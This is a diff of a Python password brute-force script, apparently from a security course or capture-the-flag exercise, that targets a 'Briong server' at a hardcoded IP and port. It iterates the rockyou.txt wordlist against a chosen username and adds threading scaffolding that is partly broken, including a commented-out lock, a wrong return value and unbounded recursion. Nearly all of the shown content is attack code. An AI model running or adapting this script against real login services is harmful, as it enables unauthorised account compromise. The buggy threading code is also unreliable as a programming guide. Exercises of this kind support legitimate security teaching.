@@ -30,9 +30,27 @@
 import socket
 import sys
 
+from threading import Thread, Lock
+
+
 host = "142.93.117.193" # IP address here
 port = 1337 # Port here
 wordlist = "/home/justin/rockyou.txt" # Point to wordlist file
+
+class Manager:
+    def __init__(self):
+        self.fp = open(wordlist)
+        self.lock = Lock()
+
+    def get(self):
+        result = None
+        # with (self.lock):
+        line = self.fp.readline()
+        if(line):
+            result = line
+
+        return line
+
 
 def brute_force():
     """
@@ -53,15 +71,47 @@ def brute_force():
             through each possible password and repeatedly attempt to login to
             the Briong server.
     """
-
-    username = "kruegster1990"   # Hint: use OSINT
-    username = "fred"
+    username = "kruegster"   # Hint: use OSINT
 
     with open(wordlist) as fp:
         line = fp.readline()
         while line:
             login(username, line.strip("\n"))
             line = fp.readline()
+    """
+
+    manager = Manager()
+    start_threads(manager)
+    """
+
+def run_thread(callback):
+   
+
+ 
+    password = callback.get()
+   
+    username = "kruegster"   # Hint: use OSINT
+
+    if password != None:
+        login(username, password.strip("\n"))
+        run_thread(callback)
+    else:
+        return
+
+def start_threads(callback):
+    num_threads =1 
+
+    threads = []
+
+    for num in range(0, num_threads):
+
+        thread = Thread(target = run_thread, args=(callback,))
+        threads.append(thread)
+        thread.start()
+
+    for thread in threads:
+        thread.join()
+
 
 def login(username, password):
 
